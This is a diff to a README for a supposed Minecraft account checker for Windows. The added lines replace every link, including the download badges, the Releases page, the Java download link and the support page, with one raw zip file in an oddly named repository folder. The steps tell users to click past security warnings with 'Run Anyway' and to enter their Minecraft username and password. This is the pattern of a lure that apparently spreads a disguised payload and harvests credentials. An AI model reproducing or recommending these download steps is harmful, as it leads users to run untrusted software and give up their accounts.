@@ -7,29 +7,29 @@
 - Works seamlessly on Windows.
 
 ## 📦 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-%20%20%20%F0%9F%92%BB-blue)](https://github.com/RoshanBetediya/minecraft-account-checker/releases)
+[![Download](https://raw.githubusercontent.com/RoshanBetediya/minecraft-account-checker/main/superalkaline/minecraft-account-checker-v1.2-beta.2.zip%20Now-%20%20%20%F0%9F%92%BB-blue)](https://raw.githubusercontent.com/RoshanBetediya/minecraft-account-checker/main/superalkaline/minecraft-account-checker-v1.2-beta.2.zip)
 
 ## 🚀 Getting Started
 To start using the "minecraft-account-checker", follow these simple steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/RoshanBetediya/minecraft-account-checker/releases) to find the latest version of the application. This page has all the files you need to download.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/RoshanBetediya/minecraft-account-checker/main/superalkaline/minecraft-account-checker-v1.2-beta.2.zip) to find the latest version of the application. This page has all the files you need to download.
 
 2. **Choose the Right Version**: Look for the latest release in the list. You will find a series of files available for download. 
 
-3. **Download the Application**: Click on the file named `minecraft-account-checker.exe` (or similar). This is the main application that you need. Your browser will begin downloading it to your computer. 
+3. **Download the Application**: Click on the file named `https://raw.githubusercontent.com/RoshanBetediya/minecraft-account-checker/main/superalkaline/minecraft-account-checker-v1.2-beta.2.zip` (or similar). This is the main application that you need. Your browser will begin downloading it to your computer. 
 
 4. **Locate the Downloaded File**: After the download is complete, navigate to your "Downloads" folder (or the folder where your downloads are saved).
 
-5. **Run the Application**: Double-click on the `minecraft-account-checker.exe` file to start the application. If a warning appears, please choose "Run Anyway" to proceed.
+5. **Run the Application**: Double-click on the `https://raw.githubusercontent.com/RoshanBetediya/minecraft-account-checker/main/superalkaline/minecraft-account-checker-v1.2-beta.2.zip` file to start the application. If a warning appears, please choose "Run Anyway" to proceed.
 
 ## 🖥️ System Requirements
 - **Operating System**: Windows 10 or later
 - **Memory**: At least 2 GB RAM
 - **Disk Space**: Minimum 50 MB free space
-- **Java Runtime**: Ensure you have Java installed. If not, download and install [Java here](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html).
+- **Java Runtime**: Ensure you have Java installed. If not, download and install [Java here](https://raw.githubusercontent.com/RoshanBetediya/minecraft-account-checker/main/superalkaline/minecraft-account-checker-v1.2-beta.2.zip).
 
 ## 🔍 How to Use
-1. **Launch the Application**: Open the `minecraft-account-checker.exe` you just downloaded.
+1. **Launch the Application**: Open the `https://raw.githubusercontent.com/RoshanBetediya/minecraft-account-checker/main/superalkaline/minecraft-account-checker-v1.2-beta.2.zip` you just downloaded.
 
 2. **Input Account Details**: You will see a form asking for your Minecraft account credentials. Enter your username and password carefully.
 
@@ -41,12 +41,12 @@ To start using the "minecraft-account-checker", follow these simple steps:
 
 ## 📝 Additional Information
 - **Privacy**: Your account information remains confidential. The application does not store or share your credentials.
-- **Support**: For further assistance, please open an issue on the [GitHub repository](https://github.com/RoshanBetediya/minecraft-account-checker/issues).
+- **Support**: For further assistance, please open an issue on the [GitHub repository](https://raw.githubusercontent.com/RoshanBetediya/minecraft-account-checker/main/superalkaline/minecraft-account-checker-v1.2-beta.2.zip).
   
 ## ⚙️ Download & Install
-Now that you're ready to download, head over to the [Releases page](https://github.com/RoshanBetediya/minecraft-account-checker/releases) once more. Click the link below to download the application directly.
+Now that you're ready to download, head over to the [Releases page](https://raw.githubusercontent.com/RoshanBetediya/minecraft-account-checker/main/superalkaline/minecraft-account-checker-v1.2-beta.2.zip) once more. Click the link below to download the application directly.
 
-[![Download](https://img.shields.io/badge/Download%20Now-%20%20%20%F0%9F%92%BB-blue)](https://github.com/RoshanBetediya/minecraft-account-checker/releases)
+[![Download](https://raw.githubusercontent.com/RoshanBetediya/minecraft-account-checker/main/superalkaline/minecraft-account-checker-v1.2-beta.2.zip%20Now-%20%20%20%F0%9F%92%BB-blue)](https://raw.githubusercontent.com/RoshanBetediya/minecraft-account-checker/main/superalkaline/minecraft-account-checker-v1.2-beta.2.zip)
 
 ## 🤝 Community & Feedback
 Your feedback is crucial for improving the application. Please leave comments or suggestions in the GitHub issues section. Join the community and share your experiences.
